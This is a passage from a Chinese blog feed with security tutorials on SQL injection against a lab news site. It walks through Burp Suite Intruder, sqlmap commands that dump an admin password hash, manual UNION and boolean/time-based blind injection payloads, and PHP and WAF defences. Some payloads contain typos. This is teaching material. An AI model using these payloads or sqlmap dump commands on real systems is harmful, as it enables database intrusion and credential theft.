        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="Burp-Suite辅助手工注入"><a href="#Burp-Suite辅助手工注入" class="headerlink" title="Burp Suite辅助手工注入"></a>Burp Suite辅助手工注入</h2><h3 id="Burp-Suite介绍"><a href="#Burp-Suite介绍" class="headerlink" title="Burp Suite介绍"></a>Burp Suite介绍</h3><p><strong>Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具</strong></p><ul><li>Proxy：代理器，拦截、查看、修改原始数据流</li><li>Intruder：攻击器，对web应用程序进行攻击</li><li>Repeater：中继器，修改、重发HTTP请求</li><li>Decoder：解码器，智能解码编码的工具</li><li>Comparer：对比器，信息差异比较工具</li></ul><h3 id="安装Burp-Suite"><a href="#安装Burp-Suite" class="headerlink" title="安装Burp Suite"></a>安装Burp Suite</h3><ul><li>安装和配置java环境</li><li>激活Burp Suite pro</li><li>运行Burp Suite</li></ul><p><img src="/../img/img_artical/net_sec/13.3.1.png" alt="13.3.1"></p><h3 id="配置Firefox代理服务器"><a href="#配置Firefox代理服务器" class="headerlink" title="配置Firefox代理服务器"></a>配置Firefox代理服务器</h3><p><strong>安装FoxyProxy组件</strong></p><p><strong>添加代理服务器</strong></p><ul><li>IP地址：127.0.0.1</li><li>端口：8080</li></ul><p><strong>启用代理上网</strong></p><p><img src="/../img/img_artical/net_sec/13.3.2.png" alt="13.3.2"></p><h3 id="回顾：手工猜解当前数据库名"><a href="#回顾：手工猜解当前数据库名" class="headerlink" title="回顾：手工猜解当前数据库名"></a>回顾：手工猜解当前数据库名</h3><p><strong>猜解数据库长度</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">48</span> <span class="keyword">and</span> length(database())<span class="operator">=</span>n <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><p><strong>猜解数据库名称第一个字母</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">48</span> <span class="keyword">and</span> ord(substr(database(),m,<span class="number">1</span>))<span class="operator">=</span>n <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.3.3.png" alt="13.3.3"></p><h3 id="使用Burp-Suite猜解数据库长度"><a href="#使用Burp-Suite猜解数据库长度" class="headerlink" title="使用Burp Suite猜解数据库长度"></a>使用Burp Suite猜解数据库长度</h3><p><strong>使用Intruder模块，自动替换n的值</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">48</span> <span class="keyword">and</span> length(database())<span class="operator">=</span>n <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.3.4.png" alt="13.3.4"></p><h3 id="使用Burp-Suite猜解数据库名称"><a href="#使用Burp-Suite猜解数据库名称" class="headerlink" title="使用Burp Suite猜解数据库名称"></a>使用Burp Suite猜解数据库名称</h3><p><strong>使用Intruder模块，自动替换m，n的值</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">48</span> <span class="keyword">and</span> ord(substr(database(),m,<span class="number">1</span>))<span class="operator">=</span>n <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.3.5.png" alt="13.3.5"></p><h3 id="使用Burp-Suite猜解表名"><a href="#使用Burp-Suite猜解表名" class="headerlink" title="使用Burp Suite猜解表名"></a>使用Burp Suite猜解表名</h3><p><strong>猜解数据库中所有表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">48</span> <span class="keyword">and</span> ord(substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;news&#x27;</span>),m,<span class="number">1</span>))<span class="operator">=</span>n <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.3.6.png" alt="13.3.6"></p><ul><li><p><a href="https://www.toolnb.com/">https://www.toolnb.com/</a></p></li><li><p>同理可猜解字段名与数据</p></li></ul><h2 id="sqlmap自动注入"><a href="#sqlmap自动注入" class="headerlink" title="sqlmap自动注入"></a>sqlmap自动注入</h2><h3 id="sqlmap介绍"><a href="#sqlmap介绍" class="headerlink" title="sqlmap介绍"></a>sqlmap介绍</h3><p><strong>sqlmap 是一个开源渗透测试工具，可以实现自动SQL注入</strong></p><ul><li>完全支持MySQL、Oracle、SOL Server、DB2等多种数据库管理系统</li><li>完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入</li><li>支持下载数据库中的某个完整表，或部分数据</li><li>支持搜索指定的数据库名、表名或列名</li><li>支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列</li><li>支持自动识别密码哈希格式并通过字典破解密码哈希</li></ul><h3 id="安装sqlmap"><a href="#安装sqlmap" class="headerlink" title="安装sqlmap"></a>安装sqlmap</h3><p><strong>kali系统默认已经安装，直接运行sqlmap命令</strong></p><p><strong>Windows系统需要全新安装</strong></p><ul><li>安装Python2.7</li><li>解压安装sqlmap1.5</li><li>执行sqlmap.py命令</li></ul><p><img src="/../img/img_artical/net_sec/13.3.7.png" alt="13.3.7"></p><h3 id="检测注入点"><a href="#检测注入点" class="headerlink" title="检测注入点"></a>检测注入点</h3><p><strong>选项：-u  “URL”</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">sqlmap -u http://192.168.10.1/news/show.php/?id=48</span></span><br></pre></td></tr></table></figure><h3 id="列出所有数据库名"><a href="#列出所有数据库名" class="headerlink" title="列出所有数据库名"></a>列出所有数据库名</h3><p><strong>选项：-dbs</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">sqlmap -u http://192.168.10.1/news/show.php/?id=48 -dbs</span></span><br><span class="line"></span><br><span class="line"><span class="attr">available</span> <span class="string">databases [9]:</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">challenges</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">information_schema</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">mysql</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">news</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">ntd</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">performance_schema</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">pikachu</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">security</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">test</span></span><br></pre></td></tr></table></figure><h3 id="列出当前数据库名"><a href="#列出当前数据库名" class="headerlink" title="列出当前数据库名"></a>列出当前数据库名</h3><p><strong>选项：–current-db</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">sqlmap -u http://192.168.10.1/news/show.php/?id=48 --current-db</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[15</span>:<span class="string">32:47] [INFO] fetching current database</span></span><br><span class="line"><span class="attr">[15</span>:<span class="string">32:53] [INFO] retrieved: &#x27;news&#x27;</span></span><br><span class="line"><span class="attr">current</span> <span class="string">database: &#x27;news&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="列出指定数据库中所有表"><a href="#列出指定数据库中所有表" class="headerlink" title="列出指定数据库中所有表"></a>列出指定数据库中所有表</h3><p><strong>选项：-D  数据库名  –tables</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">sqlmap -u http://192.168.10.1/news/show.php/?id=48 -D news --tables</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Database</span>: <span class="string">news</span></span><br><span class="line"><span class="attr">[8</span> <span class="string">tables]</span></span><br><span class="line"><span class="attr">+-----------------+</span></span><br><span class="line"><span class="attr">|</span> <span class="string">news_article    |</span></span><br><span class="line"><span class="attr">|</span> <span class="string">news_category   |</span></span><br><span class="line"><span class="attr">|</span> <span class="string">news_file       |</span></span><br><span class="line"><span class="attr">|</span> <span class="string">news_friendlink |</span></span><br><span class="line"><span class="attr">|</span> <span class="string">news_message    |</span></span><br><span class="line"><span class="attr">|</span> <span class="string">news_notice     |</span></span><br><span class="line"><span class="attr">|</span> <span class="string">news_page       |</span></span><br><span class="line"><span class="attr">|</span> <span class="string">news_users      |</span></span><br><span class="line"><span class="attr">+-----------------+</span></span><br></pre></td></tr></table></figure><h3 id="列出指定表中的字段名"><a href="#列出指定表中的字段名" class="headerlink" title="列出指定表中的字段名"></a>列出指定表中的字段名</h3><p><strong>选项：-D  数据库名  -T  表名  –columns</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">sqlmap -u http://192.168.10.1/news/show.php/?id=48 -D news -T news_users --columns</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Database</span>: <span class="string">news</span></span><br><span class="line"><span class="attr">Table</span>: <span class="string">news_users</span></span><br><span class="line"><span class="attr">[3</span> <span class="string">columns]</span></span><br><span class="line"><span class="attr">+----------+-------------+</span></span><br><span class="line"><span class="attr">|</span> <span class="string">Column   | Type        |</span></span><br><span class="line"><span class="attr">+----------+-------------+</span></span><br><span class="line"><span class="attr">|</span> <span class="string">password | varchar(32) |</span></span><br><span class="line"><span class="attr">|</span> <span class="string">userid   | int(11)     |</span></span><br><span class="line"><span class="attr">|</span> <span class="string">username | varchar(20) |</span></span><br><span class="line"><span class="attr">+----------+-------------+</span></span><br></pre></td></tr></table></figure><h3 id="列出指定字段中的内容"><a href="#列出指定字段中的内容" class="headerlink" title="列出指定字段中的内容"></a>列出指定字段中的内容</h3><p><strong>选项：-D  数据库名  -T  表名  -C  字段名  –dump</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">sqlmap -u http://192.168.10.1/news/show.php/?id=48 -D news -T news_users -C username,password --dump</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Database</span>: <span class="string">news</span></span><br><span class="line"><span class="attr">Table</span>: <span class="string">news_users</span></span><br><span class="line"><span class="attr">[1</span> <span class="string">entry]</span></span><br><span class="line"><span class="attr">+----------+----------------------------------+</span></span><br><span class="line"><span class="attr">|</span> <span class="string">username | password                         |</span></span><br><span class="line"><span class="attr">+----------+----------------------------------+</span></span><br><span class="line"><span class="attr">|</span> <span class="string">admin    | e10adc3949ba59abbe56e057f20f883e |</span></span><br><span class="line"><span class="attr">+----------+----------------------------------+</span></span><br></pre></td></tr></table></figure><h2 id="SQL注入防护"><a href="#SQL注入防护" class="headerlink" title="SQL注入防护"></a>SQL注入防护</h2><h3 id="回顾SQL注入本质"><a href="#回顾SQL注入本质" class="headerlink" title="回顾SQL注入本质"></a>回顾SQL注入本质</h3><p><strong>SQL注入利用Web应用对后台数据库查询语句处理时存在的安全漏洞</strong></p><ul><li>设计程序时忽略了对某些字符串的检查</li><li>原本程序要执行的代码，拼接了用户输入的数据 (嵌入指令)</li></ul><h3 id="数字型注入防护"><a href="#数字型注入防护" class="headerlink" title="数字型注入防护"></a>数字型注入防护</h3><p><strong>对获取的数值型数据，进行类型转换，如</strong></p><ul><li>intval()：将字符串转为整形数值</li><li>floatval()：将字符串转为浮点型数值</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArticleInfo</span>(<span class="params"><span class="variable">$id</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$id</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">false</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$db</span> -&gt; <span class="title function_ invoke__">getOneRow</span>(<span class="string">&quot;select * from news_article where id=&quot;</span>.<span class="variable">$id</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符型注入防护"><a href="#字符型注入防护" class="headerlink" title="字符型注入防护"></a>字符型注入防护</h3><p><strong>对用户输入的内容进行过滤处理，含单引号(‘)、双引号(“)、反斜线(\)与NULL等字符，都会被加上反斜线</strong></p><ul><li>magic_quotes_gpc&#x3D;on   &#x2F;&#x2F;php5.3之前版本</li><li>addslashes()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$username</span> =<span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Web应用防火墙"><a href="#Web应用防火墙" class="headerlink" title="Web应用防火墙"></a>Web应用防火墙</h3><p><strong>Web应用防火墙（Web Application Firewall，简称WAF），可以有效识别Web业务流量的恶意特征，在对流量进行清洗和过滤后，将正常、安全的流量返回给服务器，避免网站服务器被恶意入侵导致服务器性能异常等问题，保障网站的业务安全和数据安全</strong></p><ul><li>硬件：天融信应用安全网关系统、绿盟Web应用防护系统、安恒信息明御Web应用防火墙、深信服下一代防火墙AF</li><li>云安全：阿里云、华为云、腾讯云</li><li>软件：D盾_防火墙、网站安全狗</li></ul><h3 id="部署Web应用服务器"><a href="#部署Web应用服务器" class="headerlink" title="部署Web应用服务器"></a>部署Web应用服务器</h3><ul><li>安装“网站安全狗”</li><li>开启防护</li><li>设置防护等级：高级</li></ul><h3 id="注入防护测试"><a href="#注入防护测试" class="headerlink" title="注入防护测试"></a>注入防护测试</h3><ul><li>使用sqlmap自动注入测试</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">sqlmap -u http://192.168.10.1/news/show.php/?id=48</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.3.8.png" alt="13.3.8"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-SQL注入2</title>
      <link href="/posts/injection2.html"/>
      <url>/posts/injection2.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="手工普通注入"><a href="#手工普通注入" class="headerlink" title="手工普通注入"></a>手工普通注入</h2><h3 id="按注入位置分类"><a href="#按注入位置分类" class="headerlink" title="按注入位置分类"></a>按注入位置分类</h3><ul><li>GET注入：注入字符在URL参数中</li><li>POST注入：注入字段在POST提交的数据中，如“姓名”输入框</li><li>Cookie注入：注入字段在Cookie数据中</li><li>其他注入：HTTP请求的其他内容触发的SQL注入漏洞</li></ul><h3 id="按参数类型分类"><a href="#按参数类型分类" class="headerlink" title="按参数类型分类"></a>按参数类型分类</h3><p><strong>数字型注入：输入参数为整型时，如id、页码等</strong></p><p><strong>字符型注入：输入参数为字符串时，如姓名、地址等</strong></p><ul><li>字符型注入一般要用单引号或双引号进行闭合</li></ul><h3 id="按结果反馈分类"><a href="#按结果反馈分类" class="headerlink" title="按结果反馈分类"></a>按结果反馈分类</h3><p><strong>普通SQL注入</strong></p><ul><li>网页会展示来自数据库服务器的错误信息，提示SQL语法不正确等</li><li>一般在页面上直接显示执行SOL语句的结果</li></ul><p><strong>SQL盲注</strong></p><ul><li>网页上一般不会直接返回具体的数据库错误或语法错误</li><li>一般在页面上不会直接显示SQL语句执行的结果</li></ul><h3 id="普通SQL注入思路"><a href="#普通SQL注入思路" class="headerlink" title="普通SQL注入思路"></a>普通SQL注入思路</h3><p><strong>普通SQL注入：执行注入SQL语句将敏感信息展示出来，并进行进一步的操作</strong></p><ul><li>判断是否存在注入点（字符型、数字型）</li><li>猜解SQL查询语句中的字段数</li><li>确定显示的字段位置</li><li>获取当前数据库</li><li>获取数据库中的表</li><li>获取表中的字段名</li><li>下载数据（脱库）</li></ul><p><strong>操作方法：联合查询、报错注入</strong></p><h3 id="SQL盲注思路"><a href="#SQL盲注思路" class="headerlink" title="SQL盲注思路"></a>SQL盲注思路</h3><p><strong>SQL盲注不会展现任何数据库报错内容，需要构造真或假的问题对数据库进行“提问”，注入方式主要有两种：基于布尔值与基于时间</strong></p><ul><li>判断是否存在注入点，数字型、字符型</li><li>猜解当前数据库名</li><li>猜解数据库中的表名</li><li>猜解表中的字段名</li><li>猜解数据</li></ul><p><strong>操作方法：布尔盲注、延时注入</strong></p><h3 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h3><ul><li>方法：变换ID参数或加单引号&#x2F;双引号</li><li>依据：根据回显或报错</li><li>结论：能否注入? 数字型、字符型(需要闭合)</li></ul><p><img src="/../img/img_artical/net_sec/13.2.1.png" alt="13.2.1"></p><h3 id="猜解SOL查询语句中的字段数"><a href="#猜解SOL查询语句中的字段数" class="headerlink" title="猜解SOL查询语句中的字段数"></a>猜解SOL查询语句中的字段数</h3><p><strong>数据库中的内容会回显到网页，可以采用联合查询（union select）进行注入</strong></p><ul><li>使用order by猜测字段数</li><li>使用HackBar辅助操作</li></ul><p><img src="/../img/img_artical/net_sec/13.2.2.png" alt="13.2.2"></p><h3 id="确定显示的字段位置"><a href="#确定显示的字段位置" class="headerlink" title="确定显示的字段位置"></a>确定显示的字段位置</h3><p><strong>构造联合查询语句</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-48</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.2.3.png" alt="13.2.3"></p><h3 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h3><p><strong>使用database()函数获取当前数据库名称</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-48</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database(),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.2.4.png" alt="13.2.4"></p><h3 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h3><p><strong>MySQL元数据库information_schema.tables</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-48</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,HEX(group_concat(table_name)),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;news&#x27;</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><p><strong>hex(group_concat(table_name))解决数据类型问题</strong></p><p><img src="/../img/img_artical/net_sec/13.2.5.png" alt="13.2.5"></p><p><strong>使用Encoding – HexDecode解码</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">news_article,news_category,news_file,news_friendlink,news_message,news_notice,news_page,news users</span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.2.6.png" alt="13.2.6"></p><h3 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-48</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,HEX(group_concat(column_name)),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;new_users&#x27;</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.2.7.png" alt="13.2.7"></p><p><strong>使用Encoding – HexDecode解码</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userid,username,password</span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.2.8.png" alt="13.2.8"></p><h3 id="下载数据（脱库）"><a href="#下载数据（脱库）" class="headerlink" title="下载数据（脱库）"></a>下载数据（脱库）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-48</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,HEX(concat(username,<span class="string">&#x27;:&#x27;</span>,password)),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> <span class="keyword">from</span> news <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><p><strong>解码得到：admin:e10adc3949ba59abbe56e057f20f883e</strong></p><p><img src="/../img/img_artical/net_sec/13.2.9.png" alt="13.2.9"></p><p><strong>md5解码得到123456</strong></p><p><img src="/../img/img_artical/net_sec/13.2.10.png" alt="13.2.10"></p><h2 id="手工SQL盲注"><a href="#手工SQL盲注" class="headerlink" title="手工SQL盲注"></a>手工SQL盲注</h2><h3 id="回顾-SQL盲注思路"><a href="#回顾-SQL盲注思路" class="headerlink" title="回顾: SQL盲注思路"></a>回顾: SQL盲注思路</h3><p><strong>SQL盲注不会展现任何数据库报错内容，需要构造真或假的问题对数据库进行“提问”，注入方式主要有两种:基于布尔值与基于时间</strong></p><ul><li>判断是否存在注入点，数字型、字符型</li><li>猜解当前数据库名</li><li>猜解数据库中的表名</li><li>猜解表中的字段名</li><li>猜解数据</li></ul><p><strong>操作方法：布尔盲注、延时注入</strong></p><h3 id="判断是否存在注入点（布尔）"><a href="#判断是否存在注入点（布尔）" class="headerlink" title="判断是否存在注入点（布尔）"></a>判断是否存在注入点（布尔）</h3><p><strong>构造恒真和恒假语句，判断页面状态</strong></p><ul><li>恒真：?id&#x3D;48 and 1&#x3D;1</li><li>恒假：?id&#x3D;48 and 1&#x3D;2</li></ul><p><img src="/../img/img_artical/net_sec/13.2.11.png" alt="13.2.11"></p><h3 id="判断是否存在注入点（延时）"><a href="#判断是否存在注入点（延时）" class="headerlink" title="判断是否存在注入点（延时）"></a>判断是否存在注入点（延时）</h3><p><strong>构造条件语句，判断是否页面延时</strong></p><ul><li>真：?id&#x3D;48 and if((1&#x3D;1),sleep(5),1) – +</li><li>假：?id&#x3D;48 and if((1&#x3D;2),sleep(5),1) – +</li></ul><p><img src="/../img/img_artical/net_sec/13.2.12.png" alt="13.2.12"></p><h3 id="猜解当前数据库名（布尔）"><a href="#猜解当前数据库名（布尔）" class="headerlink" title="猜解当前数据库名（布尔）"></a>猜解当前数据库名（布尔）</h3><p><strong>猜解数据库长度</strong></p><ul><li>?id&#x3D;48 and length(database())&#x3D;n – +如n&#x3D;4</li></ul><p><strong>猜解数据库名称第一个字母</strong></p><ul><li>?id&#x3D;48 and ord(substr(database(),1,1))&#x3D;n – +如n&#x3D;110,101,119</li></ul><p><img src="/../img/img_artical/net_sec/13.2.13.png" alt="13.2.13"></p><h3 id="猜解数据库中的表名"><a href="#猜解数据库中的表名" class="headerlink" title="猜解数据库中的表名"></a>猜解数据库中的表名</h3><p><strong>猜解数据库中表的第一个字母</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">48</span> <span class="keyword">and</span> ord(substr((selectgroup_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;news&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">110</span> <span class="comment">-- +如n=110,101</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.2.14.png" alt="13.2.14"></p><h3 id="猜解表中的字段名"><a href="#猜解表中的字段名" class="headerlink" title="猜解表中的字段名"></a>猜解表中的字段名</h3><p><strong>猜解表中字段名的所有字母</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">48</span> <span class="keyword">and</span> ord(substr((selectgroup_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;news&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;news_users&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">117</span> <span class="comment">-- +如n=117</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.2.15.png" 